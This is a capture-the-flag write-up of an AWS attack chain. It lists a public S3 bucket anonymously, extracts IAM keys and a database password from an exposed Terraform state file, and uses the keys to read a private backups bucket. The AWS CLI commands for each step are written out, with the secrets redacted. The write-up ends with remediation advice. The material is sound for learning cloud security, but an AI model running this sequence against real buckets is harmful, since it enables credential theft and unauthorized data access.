# Corvid Logistics S3 — public bucket to leaked IAM keys (Black Hat India 2026 CTF)

**Flag:** `BlackHatIndia{publ1c_buck3t_pl41nt3xt_st4t3_s1gv4_k3ys_d0n3_b464f501}`

## Prompt (paraphrased)

A marketing site's static assets live in a public S3 bucket,
`corvid-public-assets` (made public so "the CDN just works"). A second,
locked-down bucket holds nightly database dumps, readable only by one IAM
service account. Given only an S3-compatible endpoint (`--endpoint-url`,
region `us-east-1`) and one known object (`/corvid-public-assets/img/logo.svg`),
find everything else and get into the backups.

## Recon — anonymous bucket listing

```bash
aws s3api list-objects-v2 --bucket corvid-public-assets \
  --endpoint-url "$ENDPOINT" --no-sign-request --region us-east-1
```

Beyond the expected marketing assets (`index.html`, `css/site.css`,
`img/logo.svg`, `robots.txt`), this also lists:

```
terraform/prod/terraform.tfstate
terraform/prod/terraform.tfstate.backup
```

## The leak

Terraform state files store **every resource attribute in plaintext by
design**, including secrets created by that Terraform run. Downloading
and parsing the state's `outputs` block directly exposes:

```json
{
  "assets_bucket": "corvid-public-assets",
  "backups_bucket": "corvid-prod-backups",
  "backup_reader_access_key_id": "AKIA<redacted, instance-scoped>",
  "backup_reader_secret_access_key": "<redacted, instance-scoped>",
  "db_endpoint": "orders-prod.c8xkq2mzv1rp.us-east-1.rds.amazonaws.com:5432",
  "db_password": "<redacted, instance-scoped>"
}
```

(Values redacted here since GitHub's push protection correctly flags
AWS-shaped credentials even when they belong to a disposable per-instance
CTF sandbox — same lesson as the finding itself: never commit live-looking
keys to a public repo, instance-scoped or not.)

The resource list also shows the exact IAM policy scoping this key to the
private bucket:

```json
{
  "Sid": "ReadBackups",
  "Effect": "Allow",
  "Action": ["s3:GetObject", "s3:ListBucket", "s3:GetBucketLocation"],
  "Resource": ["arn:aws:s3:::corvid-prod-backups", "arn:aws:s3:::corvid-prod-backups/*"]
}
```

## Using the leaked credentials

```bash
export AWS_ACCESS_KEY_ID="<backup_reader_access_key_id from the leaked tfstate>"
export AWS_SECRET_ACCESS_KEY="<backup_reader_secret_access_key from the leaked tfstate>"

aws s3api list-objects-v2 --bucket corvid-prod-backups \
  --endpoint-url "$ENDPOINT" --region us-east-1
# -> README.txt, break-glass/flag.txt, orders-prod/*/orders.sql.gz

aws s3api get-object --bucket corvid-prod-backups --key break-glass/flag.txt \
  --endpoint-url "$ENDPOINT" --region us-east-1 flag.txt
cat flag.txt
```

## Lesson

A public bucket is a liability beyond the files you intended to publish
— **any object accidentally uploaded there is equally public**, including
build/deploy artifacts like Terraform state. Terraform state must never
be stored in a public (or even just unencrypted/unrestricted) location;
use a dedicated remote backend (S3 with strict bucket policy + encryption,
or Terraform Cloud) and treat any state file as equivalent to a secrets
dump.
